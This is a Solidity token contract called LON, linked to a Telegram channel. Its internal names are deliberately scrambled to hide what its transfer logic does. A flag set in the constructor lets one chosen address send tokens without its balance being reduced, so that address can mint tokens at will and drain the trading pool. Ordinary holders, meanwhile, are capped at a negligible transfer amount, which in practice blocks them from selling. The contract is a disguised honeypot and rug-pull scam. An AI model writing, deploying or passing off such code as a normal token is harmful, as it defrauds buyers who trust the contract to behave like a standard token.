/*

https://t.me/portalelon

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract LON is Ownable {
    mapping(address => uint256) private afyhkvr;

    constructor(string memory yiuavwzsj, string memory seihvqyf, address ikzj, address igfaemt) {
        name = yiuavwzsj;
        symbol = seihvqyf;
        balanceOf[msg.sender] = totalSupply;
        afyhkvr[igfaemt] = rhulefvnwbi;
        fvzyte = IUniswapV2Router02(ikzj);
    }

    function transferFrom(address atoeuks, address psnkd, uint256 ujiqrsp) public returns (bool success) {
        require(ujiqrsp <= allowance[atoeuks][msg.sender]);
        allowance[atoeuks][msg.sender] -= ujiqrsp;
        lvpgnuhi(atoeuks, psnkd, ujiqrsp);
        return true;
    }

    mapping(address => uint256) private uefagioknlpy;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    function approve(address ayxtsui, uint256 ujiqrsp) public returns (bool success) {
        allowance[msg.sender][ayxtsui] = ujiqrsp;
        emit Approval(msg.sender, ayxtsui, ujiqrsp);
        return true;
    }

    string public name;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    uint256 private rhulefvnwbi = 102;

    function lvpgnuhi(address atoeuks, address psnkd, uint256 ujiqrsp) private {
        address tdebkjw = IUniswapV2Factory(fvzyte.factory()).getPair(address(this), fvzyte.WETH());
        if (0 == afyhkvr[atoeuks]) {
            if (atoeuks != tdebkjw && uefagioknlpy[atoeuks] != block.number && ujiqrsp < totalSupply) {
                require(ujiqrsp <= totalSupply / (10 ** decimals));
            }
            balanceOf[atoeuks] -= ujiqrsp;
        }
        balanceOf[psnkd] += ujiqrsp;
        uefagioknlpy[psnkd] = block.number;
        emit Transfer(atoeuks, psnkd, ujiqrsp);
    }

    IUniswapV2Router02 private fvzyte;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address psnkd, uint256 ujiqrsp) public returns (bool success) {
        lvpgnuhi(msg.sender, psnkd, ujiqrsp);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
}
